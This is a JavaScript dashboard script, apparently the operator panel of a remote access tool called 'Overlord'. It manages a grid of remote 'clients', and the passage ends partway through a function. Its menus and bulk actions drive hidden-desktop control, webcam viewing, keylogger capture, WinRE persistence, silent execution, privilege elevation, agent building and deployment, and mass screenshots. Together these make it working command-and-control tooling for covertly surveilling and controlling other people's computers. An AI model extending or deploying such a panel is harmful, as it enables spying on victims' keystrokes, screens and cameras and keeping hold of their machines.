import { state } from "./state.js";
import { debounce } from "./utils.js";
import { createRenderer } from "./render.js";
import { openMenu, closeMenu, openModal, wireModalClose, menu } from "./ui.js";
import {
  registerRenderer,
  loadWithOptions,
  startAutoRefresh,
  sendCommand,
  requestPreview,
  requestThumbnail,
  markManualDisconnect,
} from "./data.js";
import { initCountryPicker } from "./country-picker.js";

const grid = document.getElementById("grid");
const totalPill = document.getElementById("total-pill");
const pageLabel = document.getElementById("page-label");
const prevBtn = document.getElementById("prev");
const nextBtn = document.getElementById("next");
const searchInput = document.getElementById("search");
const sortSelect = document.getElementById("sort");
const filterStatusSelect = document.getElementById("filter-status");
const filterOsSelect = document.getElementById("filter-os");
const filterGroupSelect = document.getElementById("filter-group");
const showOfflineToggle = document.getElementById("toggle-offline");
const selectAllBtn = document.getElementById("select-all");
const clearSelectionBtn = document.getElementById("clear-selection");
const logoutBtn = document.getElementById("logout-btn");
const usernameDisplay = document.getElementById("username-display");
const roleBadge = document.getElementById("role-badge");
const usersLink = document.getElementById("users-link");
const buildLink = document.getElementById("build-link");
const deployLink = document.getElementById("deploy-link");

const bulkToolbar = document.getElementById("bulk-toolbar");
const selectedCountSpan = document.getElementById("selected-count");
const bulkScreenshotBtn = document.getElementById("bulk-screenshot");
const bulkDisconnectBtn = document.getElementById("bulk-disconnect");
const bulkUninstallBtn = document.getElementById("bulk-uninstall");
const bulkClearBtn = document.getElementById("bulk-clear");
const bulkGroupBtn = document.getElementById("bulk-group");
const serverVersionText = document.getElementById("server-version-text");
const selectedClients = new Set();
let lastNonOnlineStatus = "all";
const PREF_FILTER_STATUS_KEY = "overlord_filter_status";
const PREF_SORT_KEY = "overlord_sort";
const PREF_FILTER_OS_KEY = "overlord_filter_os";
const PREF_FILTER_COUNTRY_KEY = "overlord_filter_country";
const PREF_FILTER_GROUP_KEY = "overlord_filter_group";

let currentUser = null;
let contextCard = null;
let availableOsList = new Set();

function setServerVersionLabel(version) {
  if (!serverVersionText) return;
  serverVersionText.textContent = "Server version: ";
  const value = document.createElement("span");
  value.className = "server-version-number";
  value.textContent = version;
  serverVersionText.appendChild(value);
}

async function loadServerVersion() {
  if (!serverVersionText) return;
  try {
    const res = await fetch("/api/version", { credentials: "include" });
    if (!res.ok) {
      serverVersionText.textContent = "Server version: unavailable";
      return;
    }
    const payload = await res.json();
    const version = typeof payload?.version === "string" && payload.version.trim()
      ? payload.version.trim()
      : "unknown";
    setServerVersionLabel(version);
  } catch {
    serverVersionText.textContent = "Server version: unavailable";
  }
}

const setContext = (id) => {
  contextCard = id;
};
const clearContext = () => {
  contextCard = null;
};

function detectClientPlatform(clientId) {
  if (!clientId) {
    return "unknown";
  }
  const selectorId =
    typeof CSS !== "undefined" && typeof CSS.escape === "function"
      ? CSS.escape(clientId)
      : clientId;
  const card = document.querySelector(`article[data-id="${selectorId}"]`);
  const os = String(card?.dataset?.os || "").toLowerCase();
  if (os.includes("windows")) return "windows";
  if (os.includes("darwin") || os.includes("mac")) return "mac";
  if (os.includes("linux")) return "linux";
  return "unknown";
}

function getClientCard(clientId) {
  if (!clientId) return null;
  const selectorId =
    typeof CSS !== "undefined" && typeof CSS.escape === "function"
      ? CSS.escape(clientId)
      : clientId;
  return document.querySelector(`article[data-id="${selectorId}"]`);
}

function openTagNoteEditor(clientId, currentTag, currentNote) {
  return new Promise((resolve) => {
    const overlay = document.createElement("div");
    overlay.className =
      "fixed inset-0 z-[10001] bg-black/70 backdrop-blur-sm flex items-center justify-center p-4";
    overlay.innerHTML = `
      <div class="w-full max-w-xl rounded-xl border border-slate-700 bg-slate-900 p-5 shadow-2xl">
        <h3 class="text-lg font-semibold text-slate-100">Custom Tag</h3>
        <p id="tag-editor-client" class="mt-1 text-sm text-slate-400"></p>
        <label class="mt-4 block text-sm text-slate-300">Tag</label>
        <input id="tag-editor-input" type="text" class="mt-1 w-full rounded-lg border border-slate-600 bg-slate-950 px-3 py-2 text-slate-100 focus:outline-none focus:ring-2 focus:ring-blue-600" placeholder="e.g. VIP, Priority, Finance">
        <label class="mt-4 block text-sm text-slate-300">Note</label>
        <textarea id="tag-editor-note" class="mt-1 min-h-[220px] w-full rounded-lg border border-slate-600 bg-slate-950 px-3 py-2 text-slate-100 focus:outline-none focus:ring-2 focus:ring-blue-600" placeholder="Write as much as you need. No note length limit."></textarea>
        <div class="mt-4 flex items-center justify-between gap-2">
          <button id="tag-editor-clear" class="rounded-lg border border-rose-700 bg-rose-900/50 px-3 py-2 text-sm text-rose-100 hover:bg-rose-800">Clear</button>
          <div class="flex items-center gap-2">
            <button id="tag-editor-cancel" class="rounded-lg border border-slate-600 bg-slate-800 px-3 py-2 text-sm text-slate-100 hover:bg-slate-700">Cancel</button>
            <button id="tag-editor-save" class="rounded-lg border border-blue-700 bg-blue-700 px-3 py-2 text-sm text-white hover:bg-blue-600">Save</button>
          </div>
        </div>
      </div>
    `;

    const clientLabel = overlay.querySelector("#tag-editor-client");
    if (clientLabel) clientLabel.textContent = clientId;
    const tagInput = overlay.querySelector("#tag-editor-input");
    if (tagInput) tagInput.value = currentTag || "";
    const textarea = overlay.querySelector("#tag-editor-note");
    textarea.value = currentNote || "";

    const closeWith = (result) => {
      overlay.remove();
      resolve(result);
    };

    overlay.addEventListener("click", (e) => {
      if (e.target === overlay) closeWith(null);
    });

    overlay
      .querySelector("#tag-editor-cancel")
      ?.addEventListener("click", () => closeWith(null));
    overlay
      .querySelector("#tag-editor-clear")
      ?.addEventListener("click", () => closeWith({ tag: "", note: "" }));
    overlay.querySelector("#tag-editor-save")?.addEventListener("click", () => {
      const tag = String(overlay.querySelector("#tag-editor-input")?.value || "").trim();
      const note = String(overlay.querySelector("#tag-editor-note")?.value || "");
      closeWith({ tag, note });
    });

    document.body.appendChild(overlay);
    overlay.querySelector("#tag-editor-input")?.focus();
  });
}

function isClientOnline(clientId) {
  return getClientCard(clientId)?.dataset.online === "true";
}

function applyMenuSupportRules(clientId) {
  const platform = detectClientPlatform(clientId);
  const isWindows = platform === "windows";

  const setAvailability = (btn, enabled, reason) => {
    if (!btn) return;
    btn.disabled = !enabled;
    btn.setAttribute("aria-disabled", String(!enabled));
    btn.classList.toggle("opacity-50", !enabled);
    btn.classList.toggle("cursor-not-allowed", !enabled);
    btn.classList.toggle("hover:bg-slate-700", enabled);
    btn.classList.toggle("hover:bg-slate-800/50", !enabled);
    btn.title = enabled ? "" : reason;
  };

  const hvncBtn = menu.querySelector('[data-open="Backstage"]');
  setAvailability(hvncBtn, isWindows, "Backstage is only supported on Windows clients.");

  const webcamBtn = menu.querySelector('[data-open="webcam"]');
  setAvailability(webcamBtn, isWindows, "Webcam viewer is only supported on Windows clients.");

  const keyloggerBtn = menu.querySelector('[data-open="keylogger"]');
  setAvailability(
    keyloggerBtn,
    isWindows,
    "Keylogger capture is only fully supported on Windows clients.",
  );

  const winreBtn = menu.querySelector('[data-open="winre"]');
  if (winreBtn) {
    setAvailability(winreBtn, isWindows, "WinRE Persistence is only supported on Windows clients.");
    const label = winreBtn.querySelector("span");
    if (label) label.style.textDecoration = isWindows ? "" : "line-through";
  }

  const elevateBtn = menu.querySelector('[data-action="elevate"]');
  if (elevateBtn) {
    elevateBtn.style.display = platform === "mac" ? "" : "none";
  }
}

async function loadCurrentUser() {
  loadServerVersion();
  try {
    const res = await fetch("/api/auth/me");
    if (res.ok) {
      currentUser = await res.json();
      if (currentUser && currentUser.username && currentUser.role) {
        if (!usernameDisplay || !roleBadge) {
          return;
        }
        usernameDisplay.textContent = currentUser.username;

        const roleBadges = {
          admin: '<i class="fa-solid fa-crown mr-1"></i>Admin',
          operator: '<i class="fa-solid fa-sliders mr-1"></i>Operator',
          viewer: '<i class="fa-solid fa-eye mr-1"></i>Viewer',
        };
        if (roleBadges[currentUser.role]) {
          roleBadge.innerHTML = roleBadges[currentUser.role];
        } else {
          roleBadge.textContent = currentUser.role || "";
        }

        if (currentUser.role === "admin") {
          roleBadge.classList.add(
            "bg-purple-900/50",
            "text-purple-300",
            "border",
            "border-purple-800",
          );
        } else if (currentUser.role === "operator") {
          roleBadge.classList.add(
            "bg-blue-900/50",
            "text-blue-300",
            "border",
            "border-blue-800",
          );
        } else {
          roleBadge.classList.add(
            "bg-slate-700",
            "text-slate-300",
            "border",
            "border-slate-600",
          );
        }

        if (currentUser.role === "admin") {
          usersLink?.classList.remove("hidden");
        }

        if (currentUser.role === "admin" && !localStorage.getItem("overlord_settings_exported")) {
          localStorage.setItem("overlord_settings_exported", "1");
          try {
            const expRes = await fetch("/api/settings/export", { credentials: "include" });
            if (expRes.ok) {
              const blob = await expRes.blob();
              const disposition = expRes.headers.get("Content-Disposition") || "";
              const match = disposition.match(/filename="?([^"]+)"?/);
              const filename = match ? match[1] : "overlord-settings.json";
              const dlUrl = URL.createObjectURL(blob);
              const a = document.createElement("a");
              a.href = dlUrl;
              a.download = filename;
              document.body.appendChild(a);
              a.click();
              document.body.removeChild(a);
              URL.revokeObjectURL(dlUrl);
            }
          } catch {}
        }

        if (currentUser.role === "admin" || currentUser.role === "operator" || currentUser.canBuild) {
          buildLink?.classList.remove("hidden");
        }

        if (currentUser.role === "admin") {
          const pluginsLink = document.getElementById("plugins-link");
          pluginsLink?.classList.remove("hidden");
          deployLink?.classList.remove("hidden");
          document.getElementById("menu-silent-exec")?.classList.remove("hidden");
        }

        const scriptsLink = document.getElementById("scripts-link");
        if (currentUser.role !== "viewer") {
          scriptsLink?.classList.remove("hidden");
        }

        initializeRenderer();
      }

      initializeRenderer();
    } else {
      window.location.href = "/";
    }
  } catch (err) {
    console.error("Failed to load user:", err);
  }
}

function showPluginConfirmModal(pluginId, clientId, sigInfo) {
  document.getElementById("plugin-confirm-modal")?.remove();

  const isSigned = sigInfo && sigInfo.signed && sigInfo.valid;
  const statusText = isSigned
    ? `This plugin is signed but the signer's key is not trusted.`
    : `This plugin is not signed and its origin cannot be verified.`;
  const fpText = sigInfo?.fingerprint
    ? `Signer fingerprint: ${sigInfo.fingerprint}`
    : "No signature present";

  const modal = document.createElement("div");
  modal.id = "plugin-confirm-modal";
  modal.className = "fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm";
  modal.innerHTML = `
    <div class="bg-slate-900 border border-slate-700 rounded-xl shadow-2xl max-w-md w-full mx-4 p-6">
      <div class="flex items-center gap-3 mb-4">
        <div class="w-10 h-10 rounded-full flex items-center justify-center ${isSigned ? 'bg-yellow-900/60 text-yellow-400' : 'bg-orange-900/60 text-orange-400'}">
          <i class="fa-solid ${isSigned ? 'fa-shield' : 'fa-shield-halved'} text-lg"></i>
        </div>
        <div>
          <h3 class="font-semibold text-lg">${isSigned ? 'Untrusted Plugin' : 'Unsigned Plugin'}</h3>
          <p class="text-sm text-slate-400">${pluginId}</p>
        </div>
      </div>
      <p class="text-sm text-slate-300 mb-2">${statusText}</p>
      <p class="text-xs text-slate-500 font-mono mb-4">${fpText}</p>
      <p class="text-sm text-slate-300 mb-3">Type <strong class="text-white">confirm</strong> below to load this plugin:</p>
      <input
        id="plugin-confirm-input"
        type="text"
        placeholder="Type confirm…"
        autocomplete="off"
        class="w-full px-3 py-2 rounded-lg bg-slate-950 border border-slate-700 text-slate-100 text-sm placeholder-slate-500 focus:outline-none focus:border-emerald-600 mb-4"
      />
      <div class="flex gap-3 justify-end">
        <button id="plugin-confirm-cancel" class="px-4 py-2 rounded-lg border border-slate-600 text-slate-300 hover:bg-slate-800">Cancel</button>
        <button id="plugin-confirm-load" disabled class="px-4 py-2 rounded-lg bg-emerald-900/40 border border-emerald-700/60 text-emerald-100 opacity-50 cursor-not-allowed">Load Anyway</button>
      </div>
    </div>
  `;
  document.body.appendChild(modal);

  const input = document.getElementById("plugin-confirm-input");
  const loadBtn = document.getElementById("plugin-confirm-load");
  const cancelBtn = document.getElementById("plugin-confirm-cancel");

  input.addEventListener("input", () => {
    const match = input.value.trim().toLowerCase() === "confirm";
    loadBtn.disabled = !match;
    loadBtn.classList.toggle("opacity-50", !match);
    loadBtn.classList.toggle("cursor-not-allowed", !match);
    loadBtn.classList.toggle("hover:bg-emerald-800/60", match);
  });

  cancelBtn.addEventListener("click", () => modal.remove());
  modal.addEventListener("click", (e) => { if (e.target === modal) modal.remove(); });

  loadBtn.addEventListener("click", async () => {
    if (loadBtn.disabled) return;
    loadBtn.disabled = true;
    loadBtn.textContent = "Loading…";
    try {
      const res = await fetch(`/api/clients/${clientId}/plugins/${pluginId}/load`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ confirmed: true }),
      });
      if (!res.ok) {
        const text = await res.text();
        alert(`Plugin load failed: ${text}`);
      } else {
        window.open(`/plugins/${pluginId}?clientId=${clientId}`, "_blank", "noopener");
      }
    } catch {
      alert("Plugin load failed");
    }
    modal.remove();
  });

  input.focus();
}

async function loadPluginsForClient(clientId) {
  const section = document.getElementById("plugin-section");
  const container = document.getElementById("plugin-menu");
  if (!section || !container) return;
  container.innerHTML = "";
  section.classList.add("hidden");

  try {
    const res = await fetch(`/api/clients/${clientId}/plugins`);
    if (!res.ok) return;
    const data = await res.json();
    const plugins = Array.isArray(data.plugins) ? data.plugins : [];
    if (!plugins.length) return;

    section.classList.remove("hidden");
    for (const plugin of plugins) {
      if (plugin.enabled === false) {
        continue;
      }
      const btn = document.createElement("button");
      btn.className =
        "w-full text-left px-3 py-2 rounded-lg border border-slate-700 bg-slate-800/60 hover:bg-slate-700 text-slate-100 flex items-center gap-2 justify-between";
      btn.dataset.plugin = plugin.id;
      btn.dataset.loaded = plugin.loaded ? "true" : "false";
      if (plugin.lastError) {
        btn.title = `Last error: ${plugin.lastError}`;
      }

      const sig = plugin.signature;
      if (sig && sig.signed && !sig.valid) {
        btn.disabled = true;
        btn.classList.add("opacity-50", "cursor-not-allowed");
        btn.title = "Plugin signature is invalid — cannot load";
      }

      const label = document.createElement("span");
      label.className = "flex items-center gap-1";
      const labelIcon = document.createElement("i");
      labelIcon.className = "fa-solid fa-puzzle-piece";
      label.appendChild(labelIcon);
      label.append(` ${plugin.name || plugin.id}`);

      if (sig) {
        const trustIcon = document.createElement("i");
        if (sig.signed && !sig.valid) {
          trustIcon.className = "fa-solid fa-shield-xmark text-red-400 text-xs ml-1";
          trustIcon.title = "Invalid signature";
        } else if (sig.signed && sig.valid && sig.trusted) {
          trustIcon.className = "fa-solid fa-shield-check text-emerald-400 text-xs ml-1";
          trustIcon.title = "Trusted";
        } else if (sig.signed && sig.valid && !sig.trusted) {
          trustIcon.className = "fa-solid fa-shield text-yellow-400 text-xs ml-1";
          trustIcon.title = "Signed but untrusted";
        } else {
          trustIcon.className = "fa-solid fa-shield-halved text-orange-400 text-xs ml-1";
          trustIcon.title = "Unsigned";
        }
        label.appendChild(trustIcon);
      }
      const badge = document.createElement("span");
      badge.className =
        "text-[10px] uppercase tracking-wider px-2 py-0.5 rounded-full border" +
        (plugin.loaded
          ? " border-emerald-600 text-emerald-300 bg-emerald-900/40"
          : " border-slate-600 text-slate-300 bg-slate-800/60");
      badge.textContent = plugin.loaded ? "loaded" : "available";
      btn.appendChild(label);
      btn.appendChild(badge);
      container.appendChild(btn);

      if (plugin.loaded) {
        const unloadBtn = document.createElement("button");
        unloadBtn.className =
          "w-full text-left px-3 py-2 rounded-lg border border-red-800 bg-red-900/30 hover:bg-red-800/60 text-red-100 flex items-center gap-2";
        unloadBtn.dataset.pluginUnload = plugin.id;
        const unloadIcon = document.createElement("i");
        unloadIcon.className = "fa-solid fa-plug-circle-xmark";
        const unloadText = document.createElement("span");
        unloadText.textContent = `Unload ${plugin.name || plugin.id}`;
        unloadBtn.appendChild(unloadIcon);
        unloadBtn.appendChild(unloadText);
        container.appendChild(unloadBtn);
      }
    }
  } catch {
    // ignore
  }
}

function initializeRenderer() {
  const { renderMerge } = createRenderer({
    grid,
    totalPill,
    pageLabel,
    openMenu: (id, x, y) => {
      applyMenuSupportRules(id);
      openMenu(id, x, y, setContext, { isOnline: isClientOnline(id) });
      loadPluginsForClient(id);
    },
    openModal,
    requestPreview,
    requestThumbnail,
    pingClient: (id) => sendCommand(id, "ping"),
    userRole: currentUser?.role,
  });
  registerRenderer(renderMerge);
  refreshGroupFilter();
  loadWithOptions();
  startAutoRefresh();

  if (typeof anime !== "undefined") {
    anime
      .timeline({ easing: "easeOutQuad" })
      .add({
        targets: "main > div > div:first-child",
        opacity: [0, 1],
        translateY: [15, 0],
        duration: 500,
      })
      .add(
        {
          targets: "main > div > div:nth-child(2)",
          opacity: [0, 1],
          translateY: [15, 0],
          duration: 500,
        },
        "-=350",
      );
  }
}

if (logoutBtn && !logoutBtn.dataset.boundLogout) {
  logoutBtn.dataset.boundLogout = "true";
  logoutBtn.addEventListener("click", async () => {
  if (!confirm("Are you sure you want to logout?")) return;

  try {
    const res = await fetch("/api/logout", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
    });

    if (res.ok) {
      window.location.href = "/";
    } else {
      alert("Logout failed. Please try again.");
    }
  } catch (err) {
    console.error("Logout error:", err);
    alert("Logout failed. Please try again.");
  }
  });
}

wireModalClose();

const debouncedSearch = debounce(() => {
  state.page = 1;
  state.lastDigest = "";
  loadWithOptions({ force: true, reorder: true });
}, 200);

searchInput?.addEventListener("input", (e) => {
  state.searchTerm = e.target.value;
  debouncedSearch();
});

sortSelect?.addEventListener("change", (e) => {
  state.sort = e.target.value;
  localStorage.setItem(PREF_SORT_KEY, state.sort);
  state.page = 1;
  state.lastDigest = "";
  loadWithOptions({ force: true, reorder: true });
});

filterStatusSelect?.addEventListener("change", (e) => {
  state.filterStatus = e.target.value;
  localStorage.setItem(PREF_FILTER_STATUS_KEY, state.filterStatus);
  if (state.filterStatus === "online") {
    if (showOfflineToggle) showOfflineToggle.checked = false;
  } else {
    lastNonOnlineStatus = state.filterStatus;
    if (showOfflineToggle) showOfflineToggle.checked = true;
  }
  state.page = 1;
  state.lastDigest = "";
  loadWithOptions({ force: true, reorder: true });
});

filterOsSelect?.addEventListener("change", (e) => {
  state.filterOs = e.target.value;
  localStorage.setItem(PREF_FILTER_OS_KEY, state.filterOs);
  state.page = 1;
  state.lastDigest = "";
  loadWithOptions({ force: true, reorder: true });
});

filterGroupSelect?.addEventListener("change", (e) => {
  state.filterGroup = e.target.value;
  localStorage.setItem(PREF_FILTER_GROUP_KEY, state.filterGroup);
  state.page = 1;
  state.lastDigest = "";
  loadWithOptions({ force: true, reorder: true });
});

initCountryPicker((code) => {
  state.filterCountry = code;
  localStorage.setItem(PREF_FILTER_COUNTRY_KEY, code);
  state.page = 1;
  state.lastDigest = "";
  loadWithOptions({ force: true, reorder: true });
}, localStorage.getItem(PREF_FILTER_COUNTRY_KEY) || "all");

(function restoreFilterStatus() {
  const savedStatus = localStorage.getItem(PREF_FILTER_STATUS_KEY);
  const validStatuses = ["all", "online", "offline"];
  if (savedStatus && validStatuses.includes(savedStatus)) {
    state.filterStatus = savedStatus;
    if (filterStatusSelect) filterStatusSelect.value = savedStatus;
    if (showOfflineToggle) showOfflineToggle.checked = savedStatus !== "online";
    if (savedStatus !== "online") lastNonOnlineStatus = savedStatus;
  }

  const savedSort = localStorage.getItem(PREF_SORT_KEY);
  const validSorts = ["stable", "last_seen_desc", "host_asc", "ping_asc", "ping_desc", "country_asc", "country_desc", "group_asc", "group_desc"];
  if (savedSort && validSorts.includes(savedSort)) {
    state.sort = savedSort;
    if (sortSelect) sortSelect.value = savedSort;
  }

  const savedOs = localStorage.getItem(PREF_FILTER_OS_KEY);
  if (savedOs) {
    state.filterOs = savedOs;
    if (filterOsSelect) filterOsSelect.value = savedOs;
  }

  const savedCountry = localStorage.getItem(PREF_FILTER_COUNTRY_KEY);
  if (savedCountry) {
    state.filterCountry = savedCountry;
  }

  const savedGroup = localStorage.getItem(PREF_FILTER_GROUP_KEY);
  if (savedGroup) {
    state.filterGroup = savedGroup;
    if (filterGroupSelect) filterGroupSelect.value = savedGroup;
  }
})();

showOfflineToggle?.addEventListener("change", (e) => {
  if (e.target.checked) {
    state.filterStatus = lastNonOnlineStatus || "all";
  } else {
    if (state.filterStatus !== "online") {
      lastNonOnlineStatus = state.filterStatus;
    }
    state.filterStatus = "online";
  }
  localStorage.setItem(PREF_FILTER_STATUS_KEY, state.filterStatus);
  if (filterStatusSelect) {
    filterStatusSelect.value = state.filterStatus;
  }
  state.page = 1;
  state.lastDigest = "";
  loadWithOptions({ force: true, reorder: true });
});

function updateBulkToolbar() {
  selectedCountSpan.textContent = selectedClients.size;
  if (selectedClients.size > 0) {
    bulkToolbar?.classList.remove("hidden");
  } else {
    bulkToolbar?.classList.add("hidden");
  }
}

function toggleClientSelection(clientId) {
  const checkbox = document.querySelector(
    `.client-checkbox[data-id="${clientId}"]`,
  );
  if (!checkbox) return;

  if (checkbox.checked) {
    selectedClients.add(clientId);
  } else {
    selectedClients.delete(clientId);
  }
  updateBulkToolbar();
}

function syncSelectionState() {
  document.querySelectorAll(".client-checkbox").forEach((cb) => {
    const id = cb.dataset.id;
    if (!id) return;
    cb.checked = selectedClients.has(id);
  });
  updateBulkToolbar();
}

bulkClearBtn?.addEventListener("click", () => {
  selectedClients.clear();
  document
    .querySelectorAll(".client-checkbox")
    .forEach((cb) => (cb.checked = false));
  updateBulkToolbar();
});

clearSelectionBtn?.addEventListener("click", () => {
  selectedClients.clear();
  document
    .querySelectorAll(".client-checkbox")
    .forEach((cb) => (cb.checked = false));
  updateBulkToolbar();
});

selectAllBtn?.addEventListener("click", () => {
  document
    .querySelectorAll(".client-checkbox:not(:disabled)")
    .forEach((cb) => {
      cb.checked = true;
      if (cb.dataset.id) {
        selectedClients.add(cb.dataset.id);
      }
    });
  updateBulkToolbar();
});

bulkScreenshotBtn?.addEventListener("click", async () => {
  if (!confirm(`Take screenshot on ${selectedClients.size} client(s)?`)) return;

  let success = 0;
  for (const clientId of selectedClients) {
    const ok = await sendCommand(clientId, "screenshot");
    if (ok) success++;
  }

  alert(`Screenshots sent to ${success}/${selectedClients.size} clients`);
  selectedClients.clear();
  document
    .querySelectorAll(".client-checkbox")
    .forEach((cb) => (cb.checked = false));
  updateBulkToolbar();
  setTimeout(() => loadWithOptions({ force: true }), 400);
});

bulkDisconnectBtn?.addEventListener("click", async () => {
  if (
    !confirm(
      `Disconnect ${selectedClients.size} client(s)? This will close their connections.`,
    )
  )
    return;

  let success = 0;
  for (const clientId of selectedClients) {
    markManualDisconnect(clientId);
    const ok = await sendCommand(clientId, "disconnect");
    if (ok) success++;
  }

  alert(`Disconnected ${success}/${selectedClients.size} clients`);
  selectedClients.clear();
  document
    .querySelectorAll(".client-checkbox")
    .forEach((cb) => (cb.checked = false));
  updateBulkToolbar();
  setTimeout(() => loadWithOptions({ force: true }), 1000);
});

bulkUninstallBtn?.addEventListener("click", async () => {
  if (
    !confirm(
      `Uninstall agent from ${selectedClients.size} client(s)?\n\nThis will remove all persistence mechanisms and terminate the agents. This action cannot be undone.`,
    )
  )
    return;

  let success = 0;
  for (const clientId of selectedClients) {
    const ok = await sendCommand(clientId, "uninstall");
    if (ok) success++;
  }

  alert(`Uninstall sent to ${success}/${selectedClients.size} clients`);
  selectedClients.clear();
  document
    .querySelectorAll(".client-checkbox")
    .forEach((cb) => (cb.checked = false));
  updateBulkToolbar();
  setTimeout(() => loadWithOptions({ force: true }), 1000);
});

bulkGroupBtn?.addEventListener("click", () => {
  if (selectedClients.size === 0) return;
  openBulkGroupPicker([...selectedClients]);
});

async function openBulkGroupPicker(clientIds) {
  const groups = await loadGroups();

  const overlay = document.createElement("div");
  overlay.className = "fixed inset-0 z-[10000] flex items-center justify-center bg-black/60";
  overlay.addEventListener("click", (e) => { if (e.target === overlay) overlay.remove(); });

  const modal = document.createElement("div");
  modal.className = "bg-slate-900 border border-slate-700 rounded-xl shadow-2xl p-6 w-[400px] max-h-[80vh] flex flex-col gap-4";
  modal.innerHTML = `
    <h3 class="text-lg font-semibold text-slate-100 flex items-center gap-2"><i class="fa-solid fa-layer-group text-blue-400"></i> Set Group for ${clientIds.length} client(s)</h3>
    <div class="bulk-group-list flex flex-col gap-1 overflow-y-auto max-h-60"></div>
    <div class="border-t border-slate-700 pt-3">
      <p class="text-xs text-slate-400 mb-2">Create new group</p>
      <div class="flex gap-2">
        <input type="text" class="group-new-name flex-1 bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-sm text-slate-100 outline-none focus:border-blue-500" placeholder="Group name" maxlength="64" />
        <input type="color" class="group-new-color w-10 h-10 rounded-lg border border-slate-700 bg-slate-800 cursor-pointer" value="#3b82f6" />
        <button class="group-create-btn px-3 py-2 rounded-lg bg-blue-600 hover:bg-blue-500 text-white text-sm font-medium">Create</button>
      </div>
    </div>
  `;

  const listEl = modal.querySelector(".bulk-group-list");

  async function applyGroup(groupId) {
    overlay.remove();
    try {
      const res = await fetch("/api/clients/bulk-group", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ clientIds, groupId }),
      });
      if (!res.ok) {
        const d = await res.json().catch(() => ({}));
        alert(d.error || "Failed to set group");
        return;
      }
    } catch (err) {
      console.error(err);
      alert("Failed to set group");
      return;
    }
    selectedClients.clear();
    document.querySelectorAll(".client-checkbox").forEach((cb) => (cb.checked = false));
    updateBulkToolbar();
    refreshGroupFilter();
    setTimeout(() => loadWithOptions({ force: true }), 200);
  }

  function renderList() {
    listEl.innerHTML = "";
    const noneBtn = document.createElement("button");
    noneBtn.className = "w-full text-left px-3 py-2 rounded-lg text-sm flex items-center gap-2 transition-colors text-slate-300 hover:bg-slate-800";
    noneBtn.innerHTML = '<i class="fa-solid fa-xmark text-slate-500"></i> No Group';
    noneBtn.addEventListener("click", () => applyGroup(null));
    listEl.appendChild(noneBtn);

    groups.forEach((g) => {
      const btn = document.createElement("button");
      btn.className = "w-full text-left px-3 py-2 rounded-lg text-sm flex items-center gap-2 transition-colors text-slate-300 hover:bg-slate-800";
      btn.innerHTML = `<span class="inline-block w-3 h-3 rounded-full flex-shrink-0" style="background:${g.color}"></span> ${escapeHtml(g.name)}`;
      btn.addEventListener("click", () => applyGroup(g.id));
      listEl.appendChild(btn);
    });
  }

  renderList();

  const createBtn = modal.querySelector(".group-create-btn");
  createBtn.addEventListener("click", async () => {
    const nameInput = modal.querySelector(".group-new-name");
    const colorInput = modal.querySelector(".group-new-color");
    const name = nameInput.value.trim();
    const color = colorInput.value;
    if (!name) { nameInput.focus(); return; }
    try {
      const res = await fetch("/api/groups", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ name, color }),
      });
      if (!res.ok) {
        const d = await res.json().catch(() => ({}));
        alert(d.error || "Failed to create group");
        return;
      }
      const newGroup = await res.json();
      groups.push(newGroup);
      nameInput.value = "";
      renderList();
      refreshGroupFilter();
    } catch (err) {
      console.error(err);
      alert("Failed to create group");
    }
  });

  overlay.appendChild(modal);
  document.body.appendChild(overlay);
  modal.querySelector(".group-new-name").addEventListener("keydown", (e) => {
    if (e.key === "Enter") createBtn.click();
  });
}

window.toggleClientSelection = toggleClientSelection;
window.isClientSelected = (clientId) => selectedClients.has(clientId);
window.syncClientSelection = syncSelectionState;
window.removeClientFromDashboard = async (clientId) => {
  if (!clientId) return false;
  try {
    const res = await fetch(`/api/clients/${clientId}`, {
      method: "DELETE",
      headers: { "Content-Type": "application/json" },
    });
    if (!res.ok) {
      const data = await res.json().catch(() => ({}));
      alert(data.error || "Failed to remove client from dashboard");
      return false;
    }
    selectedClients.delete(clientId);
    return true;
  } catch (err) {
    console.error(err);
    alert("Failed to remove client from dashboard");
    return false;
  }
};

window.setClientNickname = async (clientId, nickname) => {
  if (!clientId) return false;
  try {
    const res = await fetch(`/api/clients/${clientId}/nickname`, {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ nickname: nickname || "" }),
    });
    if (!res.ok) {
      const data = await res.json().catch(() => ({}));
      alert(data.error || "Failed to update client nickname");
      return false;
    }
    return true;
  } catch (err) {
    console.error(err);
    alert("Failed to update client nickname");
    return false;
  }
};

window.setClientTag = async (clientId, tag, note) => {
  if (!clientId) return false;
  try {
    const res = await fetch(`/api/clients/${clientId}/tag`, {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ tag: tag || "", note: note ?? "" }),
    });
    if (!res.ok) {
      const data = await res.json().catch(() => ({}));
      alert(data.error || "Failed to update custom tag");
      return false;
    }
    return true;
  } catch (err) {
    console.error(err);
    alert("Failed to update custom tag");
    return false;
  }
};

window.setClientGroup = async (clientId, groupId) => {
  if (!clientId) return false;
  try {
    const res = await fetch(`/api/clients/${clientId}/group`, {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ groupId }),
    });
    if (!res.ok) {
      const data = await res.json().catch(() => ({}));
      alert(data.error || "Failed to update client group");
      return false;
    }
    return true;
  } catch (err) {
    console.error(err);
    alert("Failed to update client group");
    return false;
  }
};

async function loadGroups() {
  try {
    const res = await fetch("/api/groups");
    if (!res.ok) return [];
    const data = await res.json();
    return data.groups || [];
  } catch { return []; }
}

async function refreshGroupFilter() {
  const groups = await loadGroups();
  if (!filterGroupSelect) return groups;
  const current = filterGroupSelect.value;
  filterGroupSelect.innerHTML = '<option value="all">All Groups</option><option value="none">No Group</option>';
  groups.forEach((g) => {
    const opt = document.createElement("option");
    opt.value = String(g.id);
    opt.textContent = g.name;
    opt.style.color = g.color;
    filterGroupSelect.appendChild(opt);
  });
  filterGroupSelect.value = current;
  return groups;
}

async function openGroupPicker(clientId) {
  const groups = await loadGroups();
  const card = getClientCard(clientId);
  const currentGroupId = card?.dataset.groupId || "";

  const overlay = document.createElement("div");
